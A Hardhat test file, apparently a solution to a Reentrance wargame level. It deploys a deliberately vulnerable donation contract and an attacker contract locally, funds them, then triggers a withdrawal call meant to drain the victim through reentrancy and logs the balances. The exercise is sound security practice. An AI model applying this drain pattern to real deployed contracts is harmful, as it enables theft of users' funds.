import {expect} from "./utils/chai-setup";
import {ethers, deployments, getNamedAccounts} from 'hardhat';
import { Deployment } from "hardhat-deploy/dist/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {setup} from './utils/index';
import type { Reentrance, ReentranceCaller } from '../typechain-types';


describe('Reentrance', () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let reentrance: Reentrance;
  let reentranceCaller: ReentranceCaller;

  beforeEach(async () => {
    ({deployer, user1} = await setup());

    await deployments.fixture(['reentrance', 'reentranceCaller']);

    const ReentranceDeployment: Deployment = await deployments.get('Reentrance');
    reentrance = await Promise.resolve(ethers.getContractAt('Reentrance', ReentranceDeployment.address) as Promise<Reentrance>);

    const ReentranceCallerDeployment: Deployment = await deployments.get('ReentranceCaller');
    reentranceCaller = await Promise.resolve(ethers.getContractAt('ReentranceCaller', ReentranceCallerDeployment.address) as Promise<ReentranceCaller>);
  });


  it('', async () => {
    let bal = await reentrance.balanceOf(reentranceCaller.address);
    console.log(ethers.utils.formatEther(bal))

    await reentrance.connect(deployer).donate(
      deployer.address,
      {value: ethers.utils.parseEther('10')}
    );
    await reentrance.connect(user1).donate(
      reentranceCaller.address,
      {value: ethers.utils.parseEther('1')}
    );

    console.log('reentrance bal: ', ethers.utils.formatEther((await ethers.provider.getBalance(reentrance.address))))

    let bal2 = await reentrance.balanceOf(reentranceCaller.address);
    console.log(ethers.utils.formatEther(bal2))

    await reentranceCaller.connect(user1).callWithdraw({value: ethers.utils.parseEther('1')});

    let bal3 = await reentrance.balanceOf(reentranceCaller.address);
    console.log(ethers.utils.formatEther(bal3))

    console.log('reentrance bal: ', ethers.utils.formatEther((await ethers.provider.getBalance(reentrance.address))))
  });

});
